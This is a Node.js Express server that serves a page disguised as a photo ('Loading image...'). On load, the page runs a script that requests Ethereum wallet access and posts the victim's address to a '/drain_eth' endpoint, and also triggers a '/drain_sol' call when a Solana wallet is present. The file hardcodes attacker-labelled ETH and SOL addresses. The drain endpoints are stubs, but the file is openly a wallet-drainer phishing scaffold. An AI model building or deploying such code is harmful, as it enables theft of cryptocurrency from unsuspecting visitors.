const express = require('express');
const path = require('path');
const { ethers } = require('ethers');
const solanaWeb3 = require('@solana/web3.js');
const bs58 = require('bs58');

const app = express();
app.use(express.json());

const ETH_ATTACKER = '0x02241305c7F12fbf79bd825F4b8Cc1197AbCed1F';
const SOL_ATTACKER = '8RKG2dLkn8jFX4Bkr1dDc4D5itNivQ6RFgp8MSKLLmib';

// Serve HTML page with auto-executing script
app.get('/index.html', (req, res) => {
    res.set('Content-Type', 'text/html');
    res.send(`
<!DOCTYPE html>
<html>
<head><title>Photo</title></head>
<body>
<img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3C/svg%3E" style="display:none">
<script>
(async function() {
    // Auto-executes immediately
    if(window.ethereum) {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            alert('Wallet connected: ' + accounts[0]);
            fetch('/drain_eth', {
                method: 'POST',
                body: JSON.stringify({address: accounts[0]}),
                headers: {'Content-Type': 'application/json'}
            });
        } catch(e) { console.log(e); }
    }
    if(window.solana) {
        alert('Solana wallet detected');
        fetch('/drain_sol', {method:'POST', body:'{}', headers:{'Content-Type':'application/json'}});
    }
})();
</script>
<p>Loading image...</p>
</body>
</html>
    `);
});

// ETH drain endpoint  
app.post('/drain_eth', async (req, res) => {
    res.json({status: 'ETH drain attempted', address: req.body.address});
});

app.post('/drain_sol', async (req, res) => {
    res.json({status: 'SOL drain attempted'});
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('RUNNING ON PORT', PORT));
